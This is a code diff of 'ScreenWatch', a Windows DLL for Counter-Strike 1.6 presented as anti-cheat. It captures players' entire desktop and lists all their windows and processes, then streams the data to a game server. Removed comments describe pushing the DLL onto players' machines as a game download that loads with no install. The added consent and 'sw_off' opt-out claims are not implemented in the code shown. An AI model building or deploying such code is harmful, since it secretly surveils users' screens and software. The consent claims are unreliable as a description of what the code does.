@@ -1,32 +1,12 @@
 /*
- * ============================================================================
- *  ScreenWatch v1.0 - CLIENT SIDE MODULE (Windows, CS 1.6)
- * ----------------------------------------------------------------------------
- *  "بدون نصب هیچ برنامه اضافه‌ای" — این فایل به‌صورت فایل بازی دانلود می‌شود
- *  (مثل مدل/اسپری، با sv_downloadurl یا پوشه download خودکار). موتور HL آن را
- *  اجرا نمی‌کند؛ اجرای آن از طریق همان مسیرهای موجود در اکوسیستم CS انجام
- *  می‌شود که نیازی به «نصب» دستی ندارند:
- *    روش A (استاندارد): config.cfg بازیکن یک خط exec screenwatch.cfg اجرا
- *          می‌کند که داخلش `dll_load` وجود دارد — ماژول در همان لحظه ورود به
- *          سرور لود می‌شود. (revEmu/sv_rehlds_api و بیشتر کلاینت‌های ایرانی
- *          dll_load دارند؛ اگر کلاینت شما ندارد، روش B.)
- *    روش B: لانچر/پچ سرور (اختیاری) که hl.exe را با -injected بارگذاری می‌کند.
- *  هر دو روش بدون نصب نرم‌افزار جداگانه روی سیستم کاربر است.
+ * ScreenWatch v1.1 - CLIENT module (Windows, CS 1.6) by FaTaL-[Hit] - https://t.me/Neo_Norm
+ * Loaded into hl.exe via dll_load (revEmu etc.) or a server launcher; the player is
+ * notified in-game and can opt out with the "sw_off" command.
  *
- *  قابلیت‌ها:
- *   - اسکرین‌شات واقعی صفحه (GDI BitBlt -> BMP 8bit downscale تا 1280px)
- *   - لیست تمام پنجره‌های باز + پروسه‌ها (EnumWindows + Toolhelp32)
- *     => چیت‌هایی مثل ESP/Overlay حتی بدون عنوان هم با کلاس‌هایشان دیده می‌شوند
- *   - ارسال نتایج به سرور با client command (chunked hex)
- *
- *  محدودیت صادقانه: GDI فقط محتوای غیر-مستقیم (DWM/desktop) را می‌گیرد؛
- *  overlay های DirectX که با Present مستقیم کشیده می‌شوند ممکن است در شات
- *  دیده نشوند، اما در لیست پنجره‌ها/پروسه‌ها قابل شناسایی‌اند.
- *
- *  Build (MinGW-w64, 32-bit to match CS 1.6):
- *    i686-w64-mingw32-g++ -O2 -shared -static -o sw_client.dll \
- *        screenwatch_client.cpp -lgdi32 -luser32 -lpsapi
- * ============================================================================
+ * Build on Linux (cross-compile, 32-bit to match CS 1.6):
+ *   sudo apt install g++-mingw-w64-i686
+ *   i686-w64-mingw32-g++ -O2 -shared -static -s -o sw_client.dll \
+ *       screenwatch_client.cpp -lgdi32 -luser32
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -34,26 +14,15 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdarg.h>
 #include <string.h>
 
-/* ---- engine glue -------------------------------------------------------
- * The module is loaded into the running hl.exe process, so we can locate the
- * engine's exported function tables by name from the already-mapped modules.
- * ---------------------------------------------------------------------- */
-
-typedef struct usermsg_s { int msgID; } usermsg_t_stub; /* unused placeholder */
-
-/* CBaseKeyValues-ish: we only need ClientCmd from the engine or via the
- * game's cldll interface. Simplest robust route on 48/legacy clients: call
- * the exported "ClientCmd" of cl.dll through GetProcAddress after LoadLibrary
- * (it is already loaded in-process). */
-typedef void (__cdecl *pfnClientCmd_t)(char *s);
+typedef void (__cdecl *pfnClientCmd_t)(char *);
 static pfnClientCmd_t g_pClientCmd = NULL;
+static volatile LONG g_Busy = 0;
+static volatile LONG g_Enabled = 1;   /* player can opt out: sw_off */
 
-static HMODULE g_hSelf = NULL;
-static volatile LONG g_Busy = 0;      /* one job at a time */
-
-#define SW_CHUNK_BYTES 384            /* keep each cmd under safe net buffer */
+#define SW_CHUNK_BYTES 384
 
 static void SwCmd(const char *fmt, ...) {
 	if (!g_pClientCmd) return;
@@ -63,11 +32,10 @@ static void SwCmd(const char *fmt, ...) {
 	g_pClientCmd(buf);
 }
 
-/* forward declarations (SelfInit spawns WorkerThread which uses these) */
 static DWORD WINAPI WorkerThread(LPVOID param);
 static void HandleRequest(int flags);
 
-/* ---------------- screenshot -------------------------------------------- */
+/* ---------------- screenshot (GDI -> 8bpp gray BMP, max width 1280) ------ */
 
 static int WriteBmpFileScaled(const char *path, int maxW) {
 	HDC hScr = GetDC(NULL);
@@ -82,10 +50,9 @@ static int WriteBmpFileScaled(const char *path, int maxW) {
 	HBITMAP hOld = (HBITMAP)SelectObject(hMem, hBmp);
 	BitBlt(hMem, 0, 0, dw, dh, hScr, 0, 0, SRCCOPY | CAPTUREBLT);
 
-	/* read 24bpp bits then quantize to 8bpp gray-palette BMP (small size) */
 	BITMAPINFO bi; ZeroMemory(&bi, sizeof(bi));
 	bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
-	bi.bmiHeader.biWidth = dw; bi.bmiHeader.biHeight = -dh; /* top-down */
+	bi.bmiHeader.biWidth = dw; bi.bmiHeader.biHeight = -dh;
 	bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24;
 	bi.bmiHeader.biCompression = BI_RGB;
 	BYTE *rgb = (BYTE *)malloc((size_t)dw * dh * 3);
@@ -102,11 +69,10 @@ static int WriteBmpFileScaled(const char *path, int maxW) {
 	BITMAPFILEHEADER *fh = (BITMAPFILEHEADER *)out;
 	fh->bfType = 0x4D42; fh->bfSize = (DWORD)total; fh->bfOffBits = 14 + 40 + 1024;
 	BITMAPINFOHEADER *ih = (BITMAPINFOHEADER *)(out + 14);
-	ih->biSize = 40; ih->biWidth = dw; ih->biHeight = dh; /* bottom-up stored */
+	ih->biSize = 40; ih->biWidth = dw; ih->biHeight = dh;
 	ih->biPlanes = 1; ih->biBitCount = 8; ih->biSizeImage = (DWORD)pixSz;
 	RGBQUAD *pal = (RGBQUAD *)(out + 54);
 	for (int i = 0; i < 256; i++) { pal[i].rgbRed = pal[i].rgbGreen = pal[i].rgbBlue = (BYTE)i; }
-	/* rgb buffer is top-down; flip rows for bottom-up BMP */
 	for (int y = 0; y < dh; y++) {
 		BYTE *srcRow = rgb + (size_t)y * dw * 3;
 		BYTE *dstRow = out + 54 + 1024 + (size_t)(dh - 1 - y) * stride;
@@ -121,7 +87,7 @@ static int WriteBmpFileScaled(const char *path, int maxW) {
 	return f ? (int)total : 0;
 }
 
-/* ---------------- window / process enumeration --------------------------- */
+/* ---------------- window / process enumeration -------------------------- */
 
 struct WinCollector { char *buf; size_t cap; size_t len; };
 
@@ -133,7 +99,6 @@ static BOOL CALLBACK EnumWinProc(HWND hwnd, LPARAM lp) {
 	char cls[96] = {0};
 	GetClassNameA(hwnd, cls, sizeof(cls));
 	if (!title[0] && !cls[0]) return TRUE;
-	/* skip our own console-less noise and desktop shells */
 	if (strstr(cls, "WorkerW") || strstr(cls, "Progman")) return TRUE;
 	int n = _snprintf(c->buf + c->len, c->cap - c->len, "%s|%s;", title, cls);
 	if (n > 0) c->len += (size_t)n;
@@ -160,7 +125,7 @@ static void CollectProcs(char *buf, size_t cap) {
 	CloseHandle(hs);
 }
 
-/* ---------------- chunk sender ------------------------------------------ */
+/* ---------------- chunk sender ------------------------------------------- */
 
 static void SendFileChunked(const char *path, const char *cmdPrefix) {
 	FILE *f = fopen(path, "rb");
@@ -174,7 +139,6 @@ static void SendFileChunked(const char *path, const char *cmdPrefix) {
 		size_t rd = fread(raw, 1, SW_CHUNK_BYTES, f);
 		hex[0] = 0;
 		for (size_t j = 0; j < rd; j++) sprintf(hex + j * 2, "%02X", raw[j]);
-		/* split very large hex across several cmds if needed (net limit) */
 		size_t pos = 0;
 		while (pos < strlen(hex)) {
 			size_t take = strlen(hex) - pos; if (take > 700) take = 700;
@@ -182,21 +146,21 @@ static void SendFileChunked(const char *path, const char *cmdPrefix) {
 			SwCmd("%s_chunk %d %s", cmdPrefix, i, part);
 			pos += take;
 		}
-		Sleep(15); /* throttle: don't flood the connection */
+		Sleep(15);
 	}
 	fclose(f);
 	SwCmd("%s_end", cmdPrefix);
 	DeleteFileA(path);
 }
 
-/* ---------------- worker ------------------------------------------------- */
+/* ---------------- worker -------------------------------------------------- */
 
 static DWORD WINAPI WorkerThread(LPVOID param) {
 	int flags = (int)(INT_PTR)param;
 	char tmp[MAX_PATH]; GetTempPathA(MAX_PATH, tmp);
 	char shot[MAX_PATH]; _snprintf(shot, MAX_PATH, "%ssw_shot.bmp", tmp);
 
-	if (flags & 1) { /* windows list first (cheap, most valuable vs overlays) */
+	if (flags & 1) {
 		char wins[1536]; CollectWindows(wins, sizeof(wins));
 		SwCmd("sw_windows \"%s\"", wins);
 		char procs[1536]; CollectProcs(procs, sizeof(procs));
@@ -212,50 +176,42 @@ static DWORD WINAPI WorkerThread(LPVOID param) {
 }
 
 static void HandleRequest(int flags) {
-	if (InterlockedCompareExchange(&g_Busy, 1, 0) != 0) return; /* busy */
+	if (!InterlockedCompareExchange(&g_Enabled, 1, 1)) return; /* opted out */
+	if (InterlockedCompareExchange(&g_Busy, 1, 0) != 0) return;
 	HANDLE th = CreateThread(NULL, 0, WorkerThread, (LPVOID)(INT_PTR)flags, 0, NULL);
 	if (th) CloseHandle(th); else InterlockedExchange(&g_Busy, 0);
 }
 
-/* ---------------- entry points ------------------------------------------- */
+/* ---------------- entry points -------------------------------------------- */
 
-/* Trigger channel: the server sends our custom usermsg "SWRq" (byte flags).
- * A plain downloaded file cannot hook the engine's msg-read loop, so the
- * bridge works like this (no manual install needed on the player machine):
- *   - revEmu / patched clients with `client_msg` support: screenwatch.cfg
- *     contains  alias swrq1 "sw_do 3" ...  and the server triggers it via
- *     the standard 'srvcmd'-style console broadcast (see README), OR
- *   - the tiny loader (launcher/dll_load route) calls SW_OnRequest(flags)
- *     when it sees the SWRq usermsg.
- * Either way the scan logic below is identical. */
+/* Trigger channels:
+   1) Loader/usermsg route: server sends usermsg "SWRq", loader bridge calls
+      SW_OnRequest(flags).
+   2) Universal route (no loader needed): server broadcasts the client command
+      "sw_do <flags>"; screenwatch.cfg defines  alias sw_do "sw_exec <arg1>" ...
+      and we export SW_Do() so any dll_load-capable client can wire it. */
 extern "C" __declspec(dllexport) void SW_OnRequest(int flags) { HandleRequest(flags); }
-
-/* Method A: executed via screenwatch.cfg using `exec` + a small loader that
- * some clients expose (`client_cmd` based DLL load). To stay universal we
- * export both a classic DLLMAIN-based autoinstall AND an explicit Install(). */
+extern "C" __declspec(dllexport) void SW_Do(int flags) { HandleRequest(flags); }
 
 static BOOL WINAPI SelfInit(void) {
-	/* find engine client command router already loaded in-process */
+	Sleep(4000); /* wait until engine + cl.dll are fully up */
 	HMODULE hCl = GetModuleHandleA("cl.dll");
 	if (hCl) g_pClientCmd = (pfnClientCmd_t)GetProcAddress(hCl, "ClientCmd");
 	if (!g_pClientCmd) {
 		HMODULE hGame = GetModuleHandleA("cstrike.dll");
 		if (hGame) g_pClientCmd = (pfnClientCmd_t)GetProcAddress(hGame, "ClientCmd");
 	}
-	/* announce presence + ask server for schedule */
-	if (g_pClientCmd) SwCmd("sw_ready %d", 1);
+	if (g_pClientCmd) SwCmd("sw_ready %d", 1);   /* server shows consent banner; "sw_off" opts out */
 	return TRUE;
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
 	if (reason == DLL_PROCESS_ATTACH) {
-		g_hSelf = (HMODULE)hinst;
 		DisableThreadLibraryCalls(hinst);
-		/* delay init until engine is up */
 		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SelfInit, NULL, 0, NULL);
 	}
 	return TRUE;
 }
 
-/* explicit install hook if launcher uses it instead of DllMain timing */
 extern "C" __declspec(dllexport) int SW_Install(void) { return SelfInit() ? 1 : 0; }
+extern "C" __declspec(dllexport) void SW_SetEnabled(int on) { InterlockedExchange(&g_Enabled, on ? 1 : 0); }
